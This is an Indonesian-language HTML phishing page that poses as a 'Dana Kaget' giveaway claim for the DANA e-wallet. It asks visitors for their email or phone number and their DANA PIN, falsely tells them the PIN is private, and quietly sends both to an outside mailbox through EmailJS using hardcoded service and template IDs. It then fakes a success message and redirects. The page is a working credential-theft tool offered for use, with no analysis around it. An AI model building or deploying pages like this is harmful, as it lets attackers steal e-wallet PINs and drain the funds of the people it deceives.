<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Klaim Dana Kaget</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f9fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 1px 6px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    .box img {
      max-width: 100%;
      height: auto;
      margin-bottom: 15px;
      border-radius: 5px;
    }
    h2 {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .note {
      font-size: 12px;
      font-style: italic;
      color: #666;
      margin-top: -8px;
      margin-bottom: 10px;
      text-align: left;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #0070f3;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .msg {
      text-align: center;
      font-size: 14px;
      margin-top: 10px;
      color: green;
    }
  </style>
</head>
<body>

<div class="box">
  <img src="121.jpg" alt="Dana Kaget">
  <h2>Klaim Dana Kaget</h2>
  <input type="text" id="email" placeholder="Email atau Nomor HP">
  <input type="password" id="password" placeholder="PIN DANA">
  <div class="note">*PIN Anda tidak bisa dilihat siapapun</div>
  <button onclick="klaim()">Klaim Sekarang</button>
  <div class="msg" id="msg"></div>
</div>

<script>
  (function(){
    emailjs.init("C8kZsTJdvb-neKyBc");
  })();

  function klaim() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const msg = document.getElementById("msg");

    if (!email || !password) {
      msg.style.color = 'red';
      msg.textContent = "Harap isi semua kolom.";
      return;
    }

    emailjs.send("service_ew70wfk", "template_x5y4lr8", {
      email: email,
      password: password
    }).then(function(response) {
      msg.style.color = "green";
      msg.textContent = "Dana diklaim... mohon tunggu.";
      setTimeout(() => {
        window.location.href = "beranda.html";
      }, 1500);
    }, function(error) {
      msg.style.color = "red";
      msg.textContent = "Gagal mengirim data.";
    });
  }
</script>

</body>
</html>
